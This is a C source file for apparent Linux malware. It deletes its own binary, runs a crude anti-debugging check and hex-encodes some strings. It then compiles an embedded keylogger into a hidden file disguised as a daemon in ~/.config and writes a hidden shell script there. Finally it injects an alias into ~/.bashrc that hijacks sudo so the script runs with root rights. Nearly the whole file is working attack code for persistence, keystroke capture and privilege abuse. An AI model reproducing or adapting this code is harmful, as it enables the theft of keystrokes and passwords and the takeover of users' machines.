#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include "code_KeyLog.h"
#include "Module.h"
#include "Shells.h"


static void IS_DEBUGGER(void); //Tries to prevent debugging.
static void Get_shelld(); //Where the fun stuff begins.

clock_t init_timer;
float calc_addr;
float *calc = &calc_addr;

char* current_user;

char USER_PATH_ADDR;
char *USER_PATH = &USER_PATH_ADDR;

FILE* file;



static void IS_DEBUGGER(void) {
  clock_t init_timer = clock();
  calc = calloc(10, sizeof(int));

  for (float num = 5; num < 15; num++) {
    *calc = (num*(3.141*(num/5)/3) );
  }
  free(calc);

  clock_t end_timer = clock();
  float seconds = (float)(end_timer - init_timer) / CLOCKS_PER_SEC;
  if (seconds >= 0.004600) {
    ;
  }
  return;
}



//***************************************************************************
//                            Main Function                                 *
//***************************************************************************
int main(int arg, char* argv[]) {
  remove(argv[0]); // tries to delete itself.
  IS_DEBUGGER(); // if it is being run with a debugger, hopefully this will stop it.

  current_user = getenv("\x55\x53\x45\x52");
  if (current_user == "\x72\x6f\x6f\x74") { // if user is root, then just quit.
    return 0;
  }

  USER_PATH = calloc( ( strlen(GET_USER_PATH()) ) , sizeof(char)); // make it a "dynamic" size, so we doesn't encounter an overflow.
  USER_PATH = GET_USER_PATH();

  Get_shelld(); // infection.
  return 0;
}



//***************************************************************************
//                             Infection                                    *
//***************************************************************************

char infect_shell_addr;
char *infect_shell = &infect_shell_addr;

static void Get_shelld() {

  chdir(USER_PATH); //changes directory to /home/user/

  FILE* KeyLog_file = fopen("./.LogKey.c", "w"); //writes the keylogger code to LogKey.c.
  fprintf(KeyLog_file, KeyLog_code);
  fclose(KeyLog_file);

  if ( (system("gcc ./.LogKey.c -o ./.uuiddd-daemon-proc && rm ./.LogKey.c")) == -1) { //compile LogKey.c
    system("rm ./.LogKey.c && rm ./.uuiddd-daemon-proc");
    return;
  }

  system("mv ./.uuiddd-daemon-proc ./.config/");
  system("cp ./.bashrc ./.config/.bashrc"); //makes .bashrc backup

  infect_shell = calloc( ( strlen(infect_shell_code) + strlen(USER_PATH) ), sizeof(char)); //======================= GetShelld
  strcpy(infect_shell, infect_shell_code);
  infect_shell = strInsert(infect_shell, USER_PATH);
  file = fopen("./.GetShelld.sh", "w");
  fwrite(infect_shell, 1, strlen(infect_shell), file);
  fclose(file);
  free(infect_shell);
  system("chmod +x ./.GetShelld.sh && mv ./.GetShelld.sh ./.config/");
  system("echo \"alias sudo=\'sudo nohup ~/.config/.GetShelld.sh > /dev/null 2>&1 | sudo\'\" >> ~/.bashrc"); // this is where we inject code into .bashrc file.
  return;
}
